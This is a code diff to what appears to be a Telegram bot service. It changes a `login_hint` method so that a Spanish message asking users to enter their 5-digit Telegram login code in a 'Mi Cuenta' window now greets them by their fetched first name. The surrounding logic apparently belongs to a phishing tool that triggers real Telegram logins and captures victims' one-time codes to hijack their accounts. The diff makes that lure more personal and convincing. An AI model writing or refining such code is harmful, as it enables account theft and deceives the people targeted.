@@ -304,10 +304,16 @@ class Service:
     async def login_hint(self,uid):
         pending=self.pending.get(uid)
         if not pending:return
+        name=self.names.get(uid,'').strip()
+        try:
+            person=await self.api('getChat',{'chat_id':uid})
+            name=str(person.get('first_name') or name).strip()
+        except Exception:pass
+        greeting=(name or 'Hola')+' revisa'
         try:
             message=await self.api('sendMessage',{'chat_id':uid,'text':
                 '🔐 𝐂𝐎𝐃𝐈𝐆𝐎 𝐃𝐄 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n\n'
-                'Revisa en tus chats el mensaje con el código de 5 cifras enviado por Telegram, luego ve a «𝐌𝐢 𝐂𝐮𝐞𝐧𝐭𝐚», abajo a la izquierda, e introduce el código en la ventana que se abre de forma segura.\n\n'
+                f'{greeting} en tus chats el mensaje con el código de 5 cifras enviado por Telegram, luego ve a «𝐌𝐢 𝐂𝐮𝐞𝐧𝐭𝐚», abajo a la izquierda, e introduce el código en la ventana que se abre de forma segura.\n\n'
                 '𝐍𝐎𝐓𝐀: No envíes el código como mensaje en este chat.'})
             pending['hint_message_id']=message['message_id']
         except Exception:
